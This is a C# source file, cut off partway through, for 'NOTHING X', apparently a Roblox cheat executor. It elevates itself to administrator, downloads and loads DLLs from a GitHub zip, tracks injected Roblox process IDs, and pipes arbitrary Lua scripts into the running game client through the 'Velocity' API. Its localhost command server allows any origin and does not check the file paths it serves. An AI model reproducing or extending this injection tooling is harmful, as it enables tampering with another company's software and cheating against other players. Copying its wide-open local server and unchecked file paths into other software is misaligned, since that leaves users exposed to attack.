using Microsoft.Web.WebView2.Core;
using Microsoft.Web.WebView2.WinForms;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.IO.Pipes;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

namespace NOTHING_X
{
    internal static class W
    {
        private static Mutex _singleInstanceMutex;
        private static string _webViewTempPath;

        [STAThread]
        private static void Main()
        {
            if (!EnsureRunAsAdministrator())
            {
                return;
            }

            EnsureTempAssets();
            KillOtherNothingXProcesses();
            ConfigureWebView2LoadPath();

            bool createdNew;
            _singleInstanceMutex = new Mutex(true, @"Global\NOTHING_X_SINGLE_INSTANCE", out createdNew);
            if (!createdNew)
            {
                return;
            }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            try
            {
                Application.Run(new MainWindow());
            }
            finally
            {
                try
                {
                    _singleInstanceMutex.ReleaseMutex();
                }
                catch
                {
                }
                _singleInstanceMutex.Dispose();
            }
        }

        private static bool EnsureRunAsAdministrator()
        {
            try
            {
                if (IsRunningAsAdministrator())
                {
                    return true;
                }

                string[] args = Environment.GetCommandLineArgs()
                    .Skip(1)
                    .Select(arg => arg.Contains(' ') ? $"\"{arg}\"" : arg)
                    .ToArray();

                var startInfo = new ProcessStartInfo
                {
                    FileName = Application.ExecutablePath,
                    Arguments = string.Join(" ", args),
                    UseShellExecute = true,
                    Verb = "runas"
                };

                Process.Start(startInfo);
            }
            catch
            {
            }

            return false;
        }

        private static bool IsRunningAsAdministrator()
        {
            try
            {
                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                {
                    WindowsPrincipal principal = new WindowsPrincipal(identity);
                    return principal.IsInRole(WindowsBuiltInRole.Administrator);
                }
            }
            catch
            {
                return false;
            }
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool SetDllDirectory(string lpPathName);

        private static void EnsureTempAssets()
        {
            try
            {
                string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
                string tempDirectory = Path.Combine(baseDirectory, "Temp");
                string[] requiredFiles =
                {
                    "logo.ico",
                    "Editor.html",
                    "Microsoft.Web.WebView2.Core.dll",
                    "Microsoft.Web.WebView2.WinForms.dll",
                    "WebView2Loader.dll"
                };

                bool hasAllFiles = Directory.Exists(tempDirectory) &&
                                   requiredFiles.All(file => File.Exists(Path.Combine(tempDirectory, file)));
                if (hasAllFiles)
                {
                    return;
                }

                string zipPath = Path.Combine(Path.GetTempPath(), "NOTHING_X_Temp.zip");
                const string downloadUrl = "https://github.com/OverlordCryx/NOTHING-X/raw/refs/heads/X/Temp.zip";

                try
                {
                    if (File.Exists(zipPath))
                    {
                        File.Delete(zipPath);
                    }
                }
                catch
                {
                }

                using (var webClient = new WebClient())
                {
                    webClient.DownloadFile(downloadUrl, zipPath);
                }

                ExtractZipToDirectoryOverwrite(zipPath, baseDirectory);

                try
                {
                    File.Delete(zipPath);
                }
                catch
                {
                }
            }
            catch
            {
            }
        }

        private static void ExtractZipToDirectoryOverwrite(string zipPath, string destinationDirectory)
        {
            string destinationRoot = Path.GetFullPath(destinationDirectory);
            if (!destinationRoot.EndsWith(Path.DirectorySeparatorChar.ToString(), StringComparison.Ordinal))
            {
                destinationRoot += Path.DirectorySeparatorChar;
            }

            using (var archive = ZipFile.OpenRead(zipPath))
            {
                foreach (ZipArchiveEntry entry in archive.Entries)
                {
                    string fullPath = Path.GetFullPath(Path.Combine(destinationRoot, entry.FullName));
                    if (!fullPath.StartsWith(destinationRoot, StringComparison.OrdinalIgnoreCase))
                    {
                        continue;
                    }

                    if (string.IsNullOrEmpty(entry.Name))
                    {
                        Directory.CreateDirectory(fullPath);
                        continue;
                    }

                    string entryDirectory = Path.GetDirectoryName(fullPath);
                    if (!string.IsNullOrEmpty(entryDirectory) && !Directory.Exists(entryDirectory))
                    {
                        Directory.CreateDirectory(entryDirectory);
                    }

                    entry.ExtractToFile(fullPath, true);
                }
            }
        }

        private static void ConfigureWebView2LoadPath()
        {
            try
            {
                _webViewTempPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Temp");
                if (!Directory.Exists(_webViewTempPath))
                {
                    Directory.CreateDirectory(_webViewTempPath);
                }

                SetDllDirectory(_webViewTempPath);

                var currentPath = Environment.GetEnvironmentVariable("PATH") ?? string.Empty;
                if (!currentPath.Split(';').Any(part => string.Equals(part.Trim(), _webViewTempPath, StringComparison.OrdinalIgnoreCase)))
                {
                    Environment.SetEnvironmentVariable("PATH", $"{_webViewTempPath};{currentPath}");
                }

                AppDomain.CurrentDomain.AssemblyResolve += (_, args) =>
                {
                    try
                    {
                        var name = new AssemblyName(args.Name).Name;
                        if (!string.Equals(name, "Microsoft.Web.WebView2.Core", StringComparison.OrdinalIgnoreCase) &&
                            !string.Equals(name, "Microsoft.Web.WebView2.WinForms", StringComparison.OrdinalIgnoreCase))
                        {
                            return null;
                        }

                        var candidate = Path.Combine(_webViewTempPath, $"{name}.dll");
                        return File.Exists(candidate) ? Assembly.LoadFrom(candidate) : null;
                    }
                    catch
                    {
                        return null;
                    }
                };
            }
            catch
            {
            }
        }

        private static void KillOtherNothingXProcesses()
        {
            Process current = Process.GetCurrentProcess();
            Process[] siblings;
            try
            {
                siblings = Process.GetProcessesByName(current.ProcessName);
            }
            catch
            {
                return;
            }

            foreach (Process process in siblings)
            {
                try
                {
                    if (process.Id == current.Id)
                    {
                        continue;
                    }

                    process.Kill();
                    process.WaitForExit(1200);
                }
                catch
                {
                }
                finally
                {
                    try
                    {
                        process.Dispose();
                    }
                    catch
                    {
                    }
                }
            }
        }
    }

    internal sealed class MainWindow : Form
    {
        private readonly LocalhostHtmlServer.APIXV _apixv;
        private readonly WebView2 _webView;
        private readonly LocalhostHtmlServer _server;
        private int _shutdownCleanupExecuted;
        private const string WindowWidthSettingKey = "WindowWidth";
        private const string WindowHeightSettingKey = "WindowHeight";

        private const int WM_NCHITTEST = 0x84;
        private const int WM_NCLBUTTONDOWN = 0xA1;
        private const int HTCAPTION = 0x2;
        private const int HTCLIENT = 0x1;
        private const int HTLEFT = 0xA;
        private const int HTRIGHT = 0xB;
        private const int HTTOP = 0xC;
        private const int HTTOPLEFT = 0xD;
        private const int HTTOPRIGHT = 0xE;
        private const int HTBOTTOM = 0xF;
        private const int HTBOTTOMLEFT = 0x10;
        private const int HTBOTTOMRIGHT = 0x11;
        private const int ResizeBorderThickness = 8;
        private const int WindowCornerRadius = 10;

        [DllImport("user32.dll")]
        private static extern bool ReleaseCapture();

        [DllImport("user32.dll")]
        private static extern IntPtr SendMessage(IntPtr hWnd, int msg, IntPtr wParam, IntPtr lParam);

        [DllImport("gdi32.dll", SetLastError = true)]
        private static extern IntPtr CreateRoundRectRgn(
            int nLeftRect,
            int nTopRect,
            int nRightRect,
            int nBottomRect,
            int nWidthEllipse,
            int nHeightEllipse);

        [DllImport("gdi32.dll", SetLastError = true)]
        private static extern bool DeleteObject(IntPtr hObject);

        public MainWindow()
        {
            _apixv = new LocalhostHtmlServer.APIXV();
            _apixv.Initialize();
            Text = "NOTHING X";
            BackColor = Color.Black;
            ForeColor = Color.White;
            MinimumSize = new Size(760, 470);
            StartPosition = FormStartPosition.CenterScreen;
            FormBorderStyle = FormBorderStyle.None;
            Opacity = 0.98;
            TopMost = true;
            ShowIcon = true;
            TryLoadTaskbarIcon();
            RestoreWindowSize();

            var htmlPath = ResolveHtmlPath();
            _server = new LocalhostHtmlServer(htmlPath);

            _webView = new WebView2
            {
                Dock = DockStyle.Fill
            };
            Controls.Add(_webView);

            Load += async (_, __) => await InitializeAsync();
            FormClosing += (_, __) => EnsureShutdownCleanup();
            FormClosed += (_, __) =>
            {
                EnsureShutdownCleanup();
                _server.Dispose();
            };
            ResizeEnd += (_, __) => SaveWindowSize();
            SizeChanged += (_, __) => ApplyWindowRegion();
        }

        private void EnsureShutdownCleanup()
        {
            if (Interlocked.Exchange(ref _shutdownCleanupExecuted, 1) == 1)
            {
                return;
            }

            try
            {
                _apixv.SInitialize();
            }
            catch
            {
            }
        }

        private static string ResolveHtmlPath()
        {
            string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Temp", "Editor.html");

            if (File.Exists(path))
                return path;

            throw new FileNotFoundException("", path);
        }





        private void TryLoadTaskbarIcon()
        {
            string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Temp", "logo.ico");

            if (!File.Exists(path))
                return;

            try
            {
                Icon = new Icon(path);
            }
            catch (Exception)
            {
            }
        }
        

        private async Task InitializeAsync()
        {
            try
            {
                ApplyWindowRegion();
                await _server.StartAsync();
                _server.CommandReceived = HandleHostCommand;

                string tempFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Temp");
                string browserExecutableFolder = File.Exists(Path.Combine(tempFolder, "msedgewebview2.exe")) ? tempFolder : null;
                string userDataFolder = Path.Combine(tempFolder, $"{Path.GetFileName(Application.ExecutablePath)}.WebView2");
                if (!Directory.Exists(userDataFolder))
                {
                    Directory.CreateDirectory(userDataFolder);
                }

                var env = await CoreWebView2Environment.CreateAsync(browserExecutableFolder, userDataFolder);
                await _webView.EnsureCoreWebView2Async(env);
                _webView.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
                _webView.CoreWebView2.Settings.AreDevToolsEnabled = true;
                _webView.CoreWebView2.Settings.IsStatusBarEnabled = false;
                _webView.CoreWebView2.WebMessageReceived += OnWebMessageReceived;

                _webView.CoreWebView2.NavigationCompleted += async (_, __) =>
                {
                    await InjectWindowBridgeAsync();

                };

                _webView.CoreWebView2.Navigate(_server.RootUrl);
            }
            catch (Exception)
            {
                Close();
            }
        }


        private async Task InjectWindowBridgeAsync()
        {
            var js = @"
                (() => {
                    const send = (type, preferDirect = false) => {
                        if (preferDirect && window.chrome && window.chrome.webview) {
                            window.chrome.webview.postMessage(type);
                            return;
                        }
                        fetch('/request', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ action: type })
                        }).catch(() => {
                            if (window.chrome && window.chrome.webview) {
                                window.chrome.webview.postMessage(type);
                            }
                        });
                    };

                    const closeBtn = document.getElementById('win-close');
                    const maxBtn = document.getElementById('win-max');
                    const minBtn = document.getElementById('win-min');
                    const bar = document.querySelector('.window-bar');
                    let pointerDown = false;
                    let startX = 0;
                    let startY = 0;
                    let dragSent = false;

                    if (closeBtn && !closeBtn.dataset.hostBound) {
                        closeBtn.dataset.hostBound = '1';
                        closeBtn.addEventListener('click', () => send('close'));
                    }
                    if (maxBtn && !maxBtn.dataset.hostBound) {
                        maxBtn.dataset.hostBound = '1';
                        maxBtn.addEventListener('click', () => send('maxToggle'));
                    }
                    if (minBtn && !minBtn.dataset.hostBound) {
                        minBtn.dataset.hostBound = '1';
                        minBtn.addEventListener('click', () => send('min'));
                    }
                    if (bar && !bar.dataset.hostDragBound) {
                        bar.dataset.hostDragBound = '1';
                        bar.addEventListener('mousedown', (e) => {
                            if (e.button !== 0) return;
                            const target = e.target;
                            if (target && target.closest('button')) return;
                            pointerDown = true;
                            dragSent = false;
                            startX = e.clientX;
                            startY = e.clientY;
                        });
                        bar.addEventListener('mousemove', (e) => {
                            if (!pointerDown || dragSent) return;
                            const target = e.target;
                            if (target && target.closest('button')) return;
                            const dx = Math.abs(e.clientX - startX);
                            const dy = Math.abs(e.clientY - startY);
                            if (dx + dy >= 4) {
                                dragSent = true;
                                send('drag', true);
                            }
                        });
                        bar.addEventListener('mouseup', () => {
                            pointerDown = false;
                            dragSent = false;
                        });
                        bar.addEventListener('mouseleave', () => {
                            pointerDown = false;
                            dragSent = false;
                        });
                        bar.addEventListener('dblclick', (e) => {
                            const target = e.target;
                            if (target && target.closest('button')) return;
                            pointerDown = false;
                            dragSent = false;
                            send('maxToggle');
                        });
                    }
                })();
            ";

            await _webView.CoreWebView2.ExecuteScriptAsync(js);
        }

        private void OnWebMessageReceived(object sender, CoreWebView2WebMessageReceivedEventArgs e)
        {
            var message = e.TryGetWebMessageAsString() ?? string.Empty;
            HandleHostCommand(message);
        }

        private void HandleHostCommand(string message)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new Action<string>(HandleHostCommand), message);
                return;
            }

            var action = message;
            var scriptBase64 = string.Empty;
            if (TryParseHostCommand(message, out var parsedAction, out var parsedScriptBase64))
            {
                action = parsedAction;
                scriptBase64 = parsedScriptBase64;
            }

            switch (action)
            {
                case "close":
                    Close();
                    break;
                case "min":
                    WindowState = FormWindowState.Minimized;
                    break;
                case "maxToggle":
                    WindowState = WindowState == FormWindowState.Maximized
                        ? FormWindowState.Normal
                        : FormWindowState.Maximized;
                    break;
                case "drag":
                    BeginDragMove();
                    break;
                case "resize-left":
                    BeginResize(HTLEFT);
                    break;
                case "resize-right":
                    BeginResize(HTRIGHT);
                    break;
                case "resize-top":
                    BeginResize(HTTOP);
                    break;
                case "resize-bottom":
                    BeginResize(HTBOTTOM);
                    break;
                case "resize-top-left":
                    BeginResize(HTTOPLEFT);
                    break;
                case "resize-top-right":
                    BeginResize(HTTOPRIGHT);
                    break;
                case "resize-bottom-left":
                    BeginResize(HTBOTTOMLEFT);
                    break;
                case "resize-bottom-right":
                    BeginResize(HTBOTTOMRIGHT);
                    break;
                case "attach":
                    _ = AttachAndPublishAsync();
                    break;
                case "execute":
                    if (!TryDecodeUtf8Base64(scriptBase64, out var script))
                    {
                        PostVelocityStatus(LocalhostHtmlServer.VelocityStates.Error, "Invalid execute payload.", true);
                        break;
                    }

                    var executeState = _apixv.Execute(script);
                    if (executeState == LocalhostHtmlServer.VelocityStates.NotAttached)
                    {
                        _apixv.VelocityStatus = LocalhostHtmlServer.VelocityStates.NotAttached;
                        PostVelocityStatus(LocalhostHtmlServer.VelocityStates.NotAttached, "NotAttached", true);
                    }
                    else
                    {
                        PostVelocityStatus(LocalhostHtmlServer.VelocityStates.Attached, "Executed", true);
                    }
                    break;
                case "status":
                    if (!LocalhostHtmlServer.APIXV.HasAnyRobloxProcess())
                    {
                        _apixv.VelocityStatus = LocalhostHtmlServer.VelocityStates.NotAttached;
                    }
                    PostVelocityStatus(_apixv.VelocityStatus, string.Empty, false);
                    break;
            }
        }

        private async Task AttachAndPublishAsync()
        {
            if (_apixv.HasLiveAttachment())
            {
                _apixv.VelocityStatus = LocalhostHtmlServer.VelocityStates.Attached;
                PostVelocityStatus(LocalhostHtmlServer.VelocityStates.Attached, "Already attached.", true);
                return;
            }

            PostVelocityStatus(LocalhostHtmlServer.VelocityStates.Attaching, "Attaching", true);

            LocalhostHtmlServer.VelocityStates result;
            try
            {
                result = await _apixv.Attach0();
            }
            catch
            {
                _apixv.VelocityStatus = LocalhostHtmlServer.VelocityStates.Error;
                result = LocalhostHtmlServer.VelocityStates.Error;
            }

            switch (result)
            {
                case LocalhostHtmlServer.VelocityStates.Attached:
                    PostVelocityStatus(LocalhostHtmlServer.VelocityStates.Attached, "Attached", true);
                    break;
                case LocalhostHtmlServer.VelocityStates.NoProcessFound:
                    PostVelocityStatus(LocalhostHtmlServer.VelocityStates.NotAttached, "No Roblox process found.", true);
                    break;
                case LocalhostHtmlServer.VelocityStates.Error:
                    PostVelocityStatus(LocalhostHtmlServer.VelocityStates.NotAttached, "Attach failed.", true);
                    break;
                default:
                    PostVelocityStatus(LocalhostHtmlServer.VelocityStates.NotAttached, result.ToString(), true);
                    break;
            }
        }

        private void PostVelocityStatus(LocalhostHtmlServer.VelocityStates status, string message, bool toast)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new Action<LocalhostHtmlServer.VelocityStates, string, bool>(PostVelocityStatus), status, message, toast);
                return;
            }

            if (_webView?.CoreWebView2 == null)
            {
                return;
            }

            var safeStatus = JsonEscape(status.ToString());
            var safeMessage = JsonEscape(message ?? string.Empty);
            var json = $"{{\"type\":\"velocityStatus\",\"status\":\"{safeStatus}\",\"message\":\"{safeMessage}\",\"toast\":{(toast ? "true" : "false")}}}";

            try
            {
                _webView.CoreWebView2.PostWebMessageAsString(json);
            }
            catch
            {
            }
        }

        private static bool TryParseHostCommand(string raw, out string action, out string scriptBase64)
        {
            action = string.Empty;
            scriptBase64 = string.Empty;

            var value = (raw ?? string.Empty).Trim();
            if (!value.StartsWith("{", StringComparison.Ordinal))
            {
                action = value;
                return false;
            }

            action = TryGetJsonStringValue(value, "action");
            scriptBase64 = TryGetJsonStringValue(value, "scriptBase64");
            return !string.IsNullOrWhiteSpace(action);
        }

        private static string TryGetJsonStringValue(string json, string key)
        {
            var keyToken = $"\"{key}\"";
            var keyIndex = json.IndexOf(keyToken, StringComparison.OrdinalIgnoreCase);
            if (keyIndex < 0)
            {
                return string.Empty;
            }

            var colonIndex = json.IndexOf(':', keyIndex + keyToken.Length);
            if (colonIndex < 0)
            {
                return string.Empty;
            }

            var firstQuote = json.IndexOf('"', colonIndex + 1);
            if (firstQuote < 0)
            {
                return string.Empty;
            }

            var secondQuote = json.IndexOf('"', firstQuote + 1);
            if (secondQuote < 0)
            {
                return string.Empty;
            }

            return json.Substring(firstQuote + 1, secondQuote - firstQuote - 1).Trim();
        }

        private static bool TryDecodeUtf8Base64(string value, out string decoded)
        {
            decoded = string.Empty;
            if (string.IsNullOrWhiteSpace(value))
            {
                return true;
            }

            try
            {
                decoded = Encoding.UTF8.GetString(Convert.FromBase64String(value));
                return true;
            }
            catch
            {
                return false;
            }
        }

        private static string JsonEscape(string value)
        {
            if (string.IsNullOrEmpty(value))
            {
                return string.Empty;
            }

            return value
                .Replace("\\", "\\\\")
                .Replace("\"", "\\\"")
                .Replace("\r", "\\r")
                .Replace("\n", "\\n")
                .Replace("\t", "\\t");
        }

        private void BeginDragMove()
        {
            if (WindowState == FormWindowState.Maximized)
            {
                var cursor = Cursor.Position;
                var screen = Screen.FromPoint(cursor).WorkingArea;
                var restore = RestoreBounds;
                if (restore.Width <= 0 || restore.Height <= 0)
                {
                    restore = new Rectangle(screen.Left + 60, screen.Top + 60, Math.Max(760, Width), Math.Max(470, Height));
                }

                var relativeX = (float)(cursor.X - screen.Left) / Math.Max(1, screen.Width);
                relativeX = Math.Max(0.05f, Math.Min(0.95f, relativeX));
                var targetX = cursor.X - (int)(restore.Width * relativeX);
                var targetY = cursor.Y - 12;

                WindowState = FormWindowState.Normal;
                Left = targetX;
                Top = targetY;
            }

            ReleaseCapture();
            SendMessage(Handle, WM_NCLBUTTONDOWN, (IntPtr)HTCAPTION, IntPtr.Zero);
        }

        private void BeginResize(int hitTest)
        {
            if (WindowState != FormWindowState.Normal)
            {
                return;
            }

            ReleaseCapture();
            SendMessage(Handle, WM_NCLBUTTONDOWN, (IntPtr)hitTest, IntPtr.Zero);
        }

        private void ApplyWindowRegion()
        {
            if (WindowState == FormWindowState.Maximized)
            {
                Region = null;
                return;
            }

            var regionHandle = CreateRoundRectRgn(
                0,
                0,
                Width + 1,
                Height + 1,
                WindowCornerRadius * 2,
                WindowCornerRadius * 2);

            if (regionHandle == IntPtr.Zero)
            {
                return;
            }

            try
            {
                Region?.Dispose();
                Region = Region.FromHrgn(regionHandle);
            }
            finally
            {
                DeleteObject(regionHandle);
            }
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_NCHITTEST && WindowState == FormWindowState.Normal)
            {
                base.WndProc(ref m);
                if ((int)m.Result == HTCLIENT)
                {
                    var clientPoint = PointToClient(Cursor.Position);
                    var left = clientPoint.X <= ResizeBorderThickness;
                    var right = clientPoint.X >= ClientSize.Width - ResizeBorderThickness;
                    var top = clientPoint.Y <= ResizeBorderThickness;
                    var bottom = clientPoint.Y >= ClientSize.Height - ResizeBorderThickness;

                    if (left && top)
                    {
                        m.Result = (IntPtr)HTTOPLEFT;
                        return;
                    }
                    if (right && top)
                    {
                        m.Result = (IntPtr)HTTOPRIGHT;
                        return;
                    }
                    if (left && bottom)
                    {
                        m.Result = (IntPtr)HTBOTTOMLEFT;
                        return;
                    }
                    if (right && bottom)
                    {
                        m.Result = (IntPtr)HTBOTTOMRIGHT;
                        return;
                    }
                    if (left)
                    {
                        m.Result = (IntPtr)HTLEFT;
                        return;
                    }
                    if (right)
                    {
                        m.Result = (IntPtr)HTRIGHT;
                        return;
                    }
                    if (top)
                    {
                        m.Result = (IntPtr)HTTOP;
                        return;
                    }
                    if (bottom)
                    {
                        m.Result = (IntPtr)HTBOTTOM;
                        return;
                    }
                }

                return;
            }

            base.WndProc(ref m);
        }

        private void SaveWindowSize()
        {
            try
            {
                if (WindowState != FormWindowState.Normal)
                {
                    return;
                }

                Application.UserAppDataRegistry.SetValue(WindowWidthSettingKey, Width, Microsoft.Win32.RegistryValueKind.DWord);
                Application.UserAppDataRegistry.SetValue(WindowHeightSettingKey, Height, Microsoft.Win32.RegistryValueKind.DWord);
            }
            catch
            {
            }
        }

        private void RestoreWindowSize()
        {
            try
            {
                var widthObj = Application.UserAppDataRegistry.GetValue(WindowWidthSettingKey);
                var heightObj = Application.UserAppDataRegistry.GetValue(WindowHeightSettingKey);
                if (widthObj == null || heightObj == null)
                {
                    return;
                }

                var width = Convert.ToInt32(widthObj);
                var height = Convert.ToInt32(heightObj);
                width = Math.Max(MinimumSize.Width, width);
                height = Math.Max(MinimumSize.Height, height);
                Size = new Size(width, height);
            }
            catch
            {
            }
        }
    }

    internal sealed class LocalhostHtmlServer : IDisposable
    {
        private const int PreferredPort = 40127;
        private readonly HttpListener _listener = new HttpListener();
        private readonly string _htmlPath;
        private readonly string _rootDir;
        private bool _running;

        public string RootUrl { get; private set; }
        public Action<string> CommandReceived { get; set; }

        public LocalhostHtmlServer(string htmlPath)
        {
            _htmlPath = htmlPath;
            _rootDir = Path.GetDirectoryName(_htmlPath) ?? AppDomain.CurrentDomain.BaseDirectory;
        }

        public async Task StartAsync()
        {
            var candidatePorts = new[] { PreferredPort, PreferredPort + 1, PreferredPort + 2 };
            Exception lastError = null;
            var started = false;

            foreach (var port in candidatePorts)
            {
                try
                {
                    RootUrl = $"http://127.0.0.1:{port}/";
                    _listener.Prefixes.Clear();
                    _listener.Prefixes.Add(RootUrl);
                    _listener.Start();
                    started = true;
                    break;
                }
                catch (Exception ex)
                {
                    lastError = ex;
                    try
                    {
                        if (_listener.IsListening)
                        {
                            _listener.Stop();
                        }
                    }
                    catch
                    {
                    }
                }
            }

            if (!started)
            {
                throw new InvalidOperationException("Cannot start local host server.", lastError);
            }

            _running = true;
            _ = Task.Run(ServeLoop);
            await Task.CompletedTask;
        }

        private async Task ServeLoop()
        {
            while (_running && _listener.IsListening)
            {
                HttpListenerContext context = null;
                try
                {
                    context = await _listener.GetContextAsync();
                    _ = Task.Run(() => HandleRequest(context));
                }
                catch (HttpListenerException)
                {
                    break;
                }
                catch (ObjectDisposedException)
                {
                    break;
                }
            }
        }

        private void HandleRequest(HttpListenerContext context)
        {
            try
            {
                var requestPath = context.Request.Url.AbsolutePath;
                if (string.Equals(requestPath, "/request", StringComparison.OrdinalIgnoreCase))
                {
                    HandleCommandRequest(context);
                    return;
                }

                if (string.IsNullOrWhiteSpace(requestPath) || requestPath == "/")
                {
                    WriteFile(context, _htmlPath, "text/html; charset=utf-8");
                    return;
                }

                var local = requestPath.TrimStart('/').Replace('/', Path.DirectorySeparatorChar);
                var candidate = Path.Combine(_rootDir, local);
                if (File.Exists(candidate))
                {
                    WriteFile(context, candidate, GetContentType(candidate));
                    return;
                }

                context.Response.StatusCode = 404;
                WriteText(context, "Not Found", "text/plain; charset=utf-8");
            }
            catch
            {
                if (context.Response.OutputStream.CanWrite)
                {
                    context.Response.StatusCode = 500;
                    WriteText(context, "Server Error", "text/plain; charset=utf-8");
                }
            }
            finally
            {
                try { context.Response.Close(); } catch { }
            }
        }

        private void HandleCommandRequest(HttpListenerContext context)
        {
            if (context.Request.HttpMethod.Equals("OPTIONS", StringComparison.OrdinalIgnoreCase))
            {
                context.Response.StatusCode = 204;
                context.Response.Headers["Access-Control-Allow-Origin"] = "*";
                context.Response.Headers["Access-Control-Allow-Methods"] = "POST, OPTIONS";
                context.Response.Headers["Access-Control-Allow-Headers"] = "Content-Type";
                return;
            }

            if (!context.Request.HttpMethod.Equals("POST", StringComparison.OrdinalIgnoreCase))
            {
                context.Response.StatusCode = 405;
                WriteText(context, "Method Not Allowed", "text/plain; charset=utf-8");
                return;
            }

            string body;
            using (var reader = new StreamReader(context.Request.InputStream, context.Request.ContentEncoding ?? Encoding.UTF8))
            {
                body = reader.ReadToEnd();
            }

            var command = ParseCommand(body);
            if (!string.IsNullOrWhiteSpace(command))
            {
                CommandReceived?.Invoke(command);
            }

            context.Response.StatusCode = 200;
            context.Response.ContentType = "application/json; charset=utf-8";
            context.Response.Headers["Access-Control-Allow-Origin"] = "*";
            WriteText(context, "{\"ok\":true}", "application/json; charset=utf-8");
        }

        private static string ParseCommand(string body)
        {
            if (string.IsNullOrWhiteSpace(body))
            {
                return string.Empty;
            }

            var trimmed = body.Trim();
            if (!trimmed.StartsWith("{", StringComparison.Ordinal))
            {
                return trimmed.Trim('"');
            }

            var keyIndex = trimmed.IndexOf("\"action\"", StringComparison.OrdinalIgnoreCase);
            if (keyIndex < 0)
            {
                return string.Empty;
            }

            var colonIndex = trimmed.IndexOf(':', keyIndex);
            if (colonIndex < 0)
            {
                return string.Empty;
            }

            var firstQuote = trimmed.IndexOf('"', colonIndex + 1);
            if (firstQuote < 0)
            {
                return string.Empty;
            }

            var secondQuote = trimmed.IndexOf('"', firstQuote + 1);
            if (secondQuote < 0)
            {
                return string.Empty;
            }

            return trimmed.Substring(firstQuote + 1, secondQuote - firstQuote - 1).Trim();
        }

        private static void WriteFile(HttpListenerContext context, string path, string contentType)
        {
            var bytes = File.ReadAllBytes(path);
            context.Response.StatusCode = 200;
            context.Response.ContentType = contentType;
            context.Response.ContentLength64 = bytes.LongLength;
            context.Response.OutputStream.Write(bytes, 0, bytes.Length);
        }

        private static void WriteText(HttpListenerContext context, string text, string contentType)
        {
            var bytes = Encoding.UTF8.GetBytes(text);
            context.Response.ContentType = contentType;
            context.Response.ContentLength64 = bytes.LongLength;
            context.Response.OutputStream.Write(bytes, 0, bytes.Length);
        }

        private static int GetFreePort()
        {
            var listener = new System.Net.Sockets.TcpListener(System.Net.IPAddress.Loopback, 0);
            listener.Start();
            var port = ((System.Net.IPEndPoint)listener.LocalEndpoint).Port;
            listener.Stop();
            return port;
        }

        private static string GetContentType(string path)
        {
            switch (Path.GetExtension(path).ToLowerInvariant())
            {
                case ".html": return "text/html; charset=utf-8";
                case ".js": return "application/javascript; charset=utf-8";
                case ".css": return "text/css; charset=utf-8";
                case ".json": return "application/json; charset=utf-8";
                case ".png": return "image/png";
                case ".jpg":
                case ".jpeg": return "image/jpeg";
                case ".webp": return "image/webp";
                case ".svg": return "image/svg+xml";
                default: return "application/octet-stream";
            }
        }

        public void Dispose()
        {
            _running = false;
            try { _listener.Stop(); } catch { }
            try { _listener.Close(); } catch { }
        }

        public class NamedPipes
        {
            public static string luapipename = "uoQcySKXSUxxJNpVQyatpHQwYoGfhcbh";

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool WaitNamedPipe(string name, int timeout);

            public static bool NamedPipeExist(string pipeName)
            {
                try
                {
                    if (!NamedPipes.WaitNamedPipe("\\\\.\\pipe\\" + pipeName, 0))
                    {
                        switch (Marshal.GetLastWin32Error())
                        {
                            case 0:
                                return false;
                            case 2:
                                return false;
                        }
                    }
                    return true;
                }
                catch (Exception)
                {
                    return false;
                }
            }

            public static void LuaPipe(string script, int pid)
            {
                if (!NamedPipes.NamedPipeExist($"{NamedPipes.luapipename}_{pid}"))
                    return;
                new Thread((ThreadStart)(() =>
                {
                    try
                    {
                        using (NamedPipeClientStream pipeClientStream = new NamedPipeClientStream(".", $"{NamedPipes.luapipename}_{pid}", PipeDirection.Out))
                        {
                            pipeClientStream.Connect();
                            using (StreamWriter streamWriter = new StreamWriter((Stream)pipeClientStream, Encoding.Default, 999999))
                            {
                                streamWriter.Write(script);
                                streamWriter.Dispose();
                            }
                            pipeClientStream.Dispose();
                        }
                    }
                    catch (IOException)
                    {
                    }
                    catch (Exception)
                    {
                    }
                })).Start();
            }
        }
        public enum VelocityStates
        {
            Attaching,
            Attached,
            NotAttached,
            NoProcessFound,
            TamperDetected,
            Error,
            Executed,
        }

        public class APIXV
        {
            HttpClient client = new HttpClient();
            private string current_version_url = "https://realvelocity.xyz/assets/current_version.txt";
            private string current_download_links_url = "https://realvelocity.xyz/assets/download_links.json";
            private Process decompilerProcess;
            public VelocityStates VelocityStatus = VelocityStates.NotAttached;
            public List<int> injected_pids = new List<int>();
            private System.Timers.Timer CommunicationTimer;
            [DllImport("user32.dll")]
            private static extern bool IsWindowVisible(IntPtr hWnd);

            [DllImport("user32.dll")]
            private static extern bool IsIconic(IntPtr hWnd);

            public static bool HasAnyRobloxProcess()
            {
                try
                {
                    return Process.GetProcessesByName("RobloxPlayerBeta").Any();
                }
                catch
                {
                    return false;
                }
            }

            public bool HasLiveAttachment()
            {
                if (this.injected_pids == null || this.injected_pids.Count == 0)
                {
                    return false;
                }

                for (int index = this.injected_pids.Count - 1; index >= 0; --index)
                {
                    int pid = this.injected_pids[index];
                    if (!this.IsPidRunning(pid))
                    {
                        this.injected_pids.RemoveAt(index);
                    }
                }

                return this.injected_pids.Count > 0;
            }

            public static string Base64Encode(string plainText)
            {
                return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
            }
